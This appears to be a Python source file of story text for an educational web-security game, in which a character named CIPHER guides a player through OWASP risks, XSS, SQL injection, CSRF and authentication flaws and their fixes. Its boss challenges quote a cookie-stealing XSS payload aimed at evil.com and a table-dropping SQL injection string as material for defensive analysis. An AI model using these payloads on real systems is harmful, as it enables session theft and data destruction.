"""
story.py — Narrative for Web Security (web_security skill pack).
Theme: Cyberpunk noir — CIPHER guides an analyst through the attack surface of the web.
"""

INTRO_STORY = """
[bold cyan]CIPHER TERMINAL — WEB SECURITY DIVISION[/bold cyan]

The breach report lands on your screen at 03:00. A corporate web application —
the kind that handles millions in transactions daily — was gutted overnight.
Stored XSS in the comment system. SQL injection in the search endpoint.
No CSRF tokens on the admin panel. Session cookies without HttpOnly or Secure
flags. The attacker didn't need a zero-day. They used techniques documented
a decade ago.

CIPHER's voice is cold, precise:

[bold cyan]"The OWASP Top 10 reads like a checklist of everything they got
wrong. Injection. Broken authentication. Cross-site scripting. Every
vulnerability was preventable. Every one was documented. Every one was
ignored."[/bold cyan]

A web architecture diagram glows on the terminal — endpoints, forms, APIs,
session flows — each one a potential entry point.

[bold white]"How do I lock it down?"[/bold white]

[bold cyan]"One vulnerability class at a time. OWASP Top 10 first — understand
the landscape. Then XSS — the most common web vulnerability. SQL injection —
the most dangerous. CSRF — the invisible request. Authentication flaws — the
keys to the kingdom. Each node is a class of attack you'll learn to find,
exploit in a sandbox, and then permanently seal."[/bold cyan]

[italic]Initializing web security framework... 5 attack surfaces to harden.[/italic]
"""

ZONE_INTROS = {
    "owasp_top_10": (
        "[bold cyan]NODE 1 — THE OWASP LANDSCAPE[/bold cyan]\n\n"
        "[bold white]CIPHER: 'The OWASP Top 10 is the security community's consensus "
        "on the most critical web application risks. Injection. Broken access control. "
        "Cryptographic failures. It's not a vulnerability scanner — it's a threat map. "
        "Learn the map before you enter the territory.'[/bold white]"
    ),
    "xss_attacks": (
        "[bold cyan]NODE 2 — CROSS-SITE SCRIPTING[/bold cyan]\n\n"
        "[bold white]CIPHER: 'XSS lets an attacker inject malicious scripts into pages "
        "viewed by other users. Reflected. Stored. DOM-based. Three variants, one root "
        "cause: untrusted data rendered as code. The fix is output encoding and "
        "Content Security Policy. The failure is trusting user input.'[/bold white]"
    ),
    "sql_injection": (
        "[bold cyan]NODE 3 — SQL INJECTION[/bold cyan]\n\n"
        "[bold white]CIPHER: 'The search endpoint built queries with string concatenation. "
        "The attacker typed a single quote and the database talked back. SQL injection "
        "has been the #1 web vulnerability for over a decade. Parameterized queries "
        "eliminate it completely. String concatenation enables it completely.'[/bold white]"
    ),
    "csrf": (
        "[bold cyan]NODE 4 — CROSS-SITE REQUEST FORGERY[/bold cyan]\n\n"
        "[bold white]CIPHER: 'The admin visited a page with a hidden form that submitted "
        "a POST request to the admin panel — using the admin's own authenticated session. "
        "The server couldn't tell the difference between a legitimate request and a "
        "forged one. CSRF tokens and SameSite cookies fix this. Their absence enables it.'[/bold white]"
    ),
    "auth_vulns": (
        "[bold cyan]NODE 5 — AUTHENTICATION VULNERABILITIES[/bold cyan]\n\n"
        "[bold white]CIPHER: 'The session token was a sequential integer. The JWT was "
        "signed with algorithm none. The OAuth redirect URI accepted any domain. "
        "Broken authentication doesn't mean the lock is hard to pick — it means "
        "there was never a real lock to begin with.'[/bold white]"
    ),
}

ZONE_COMPLETIONS = {
    "owasp_top_10": (
        "[bold green]NODE HARDENED — THE OWASP LANDSCAPE[/bold green]\n\n"
        "The OWASP Top 10 is mapped. Injection, broken access control, cryptographic "
        "failures, SSRF — you know the attack classes and their mitigations. "
        "CIPHER: 'The threat map is drawn. Now you know where the attacks will come from.'"
    ),
    "xss_attacks": (
        "[bold green]NODE HARDENED — CROSS-SITE SCRIPTING[/bold green]\n\n"
        "Reflected, stored, DOM-based XSS — identified and neutralized. Output encoding "
        "applied. Content Security Policy deployed. "
        "CIPHER: 'No more user input rendered as code. The scripts die on the page.'"
    ),
    "sql_injection": (
        "[bold green]NODE HARDENED — SQL INJECTION[/bold green]\n\n"
        "String concatenation replaced with parameterized queries. Input validation enforced. "
        "The database no longer speaks to strangers. "
        "CIPHER: 'The single quote is harmless now. The database only answers prepared questions.'"
    ),
    "csrf": (
        "[bold green]NODE HARDENED — CROSS-SITE REQUEST FORGERY[/bold green]\n\n"
        "Anti-CSRF tokens deployed. SameSite cookies enforced. Origin headers validated. "
        "The server knows who sent the request. "
        "CIPHER: 'Every state-changing request is verified. No more invisible submissions.'"
    ),
    "auth_vulns": (
        "[bold green]NODE HARDENED — AUTHENTICATION VULNERABILITIES[/bold green]\n\n"
        "Sessions randomized. JWTs properly validated. OAuth redirect URIs locked down. "
        "The keys to the kingdom are secure. "
        "CIPHER: 'The authentication layer is rebuilt from the ground up. "
        "No sequential tokens. No algorithm none. No open redirects.'"
    ),
}

BOSS_INTROS = {
    "owasp_top_10": (
        "[bold red]BOSS CHALLENGE — OWASP RISK ASSESSMENT[/bold red]\n\n"
        "[bold white]CIPHER: 'A pen test report on a new web app lists: broken access "
        "control on the admin API, hardcoded database credentials in the source, "
        "and user input reflected without encoding. Map each finding to its OWASP "
        "category and prioritize remediation. Justify your order.'[/bold white]"
    ),
    "xss_attacks": (
        "[bold red]BOSS CHALLENGE — XSS PAYLOAD ANALYSIS[/bold red]\n\n"
        "[bold white]CIPHER: 'A user-submitted comment contains: "
        "<script>document.location=\"https://evil.com/steal?\"+document.cookie</script>. "
        "Classify the XSS type, trace the attack flow from injection to cookie theft, "
        "and implement the defense — encoding, CSP, and cookie flags.'[/bold white]"
    ),
    "sql_injection": (
        "[bold red]BOSS CHALLENGE — INJECTION FORENSICS[/bold red]\n\n"
        "[bold white]CIPHER: 'The web application logs show this in the search query: "
        "' OR 1=1; DROP TABLE users; --. The users table is gone. Trace how the "
        "injection worked, explain why the application was vulnerable, and rewrite "
        "the query to be injection-proof.'[/bold white]"
    ),
    "csrf": (
        "[bold red]BOSS CHALLENGE — CSRF ATTACK CHAIN[/bold red]\n\n"
        "[bold white]CIPHER: 'An attacker crafted a page that, when visited by an "
        "authenticated admin, silently submits a form changing the admin email to "
        "the attacker's address. Then they trigger a password reset. Trace the full "
        "attack chain and implement every defense layer.'[/bold white]"
    ),
    "auth_vulns": (
        "[bold red]BOSS CHALLENGE — AUTHENTICATION AUDIT[/bold red]\n\n"
        "[bold white]CIPHER: 'Audit this authentication system: session IDs are 6-digit "
        "sequential integers, passwords are stored as unsalted SHA-1, the JWT accepts "
        "algorithm none, and the OAuth callback has an open redirect. Rank each "
        "vulnerability by severity and implement the fixes.'[/bold white]"
    ),
}
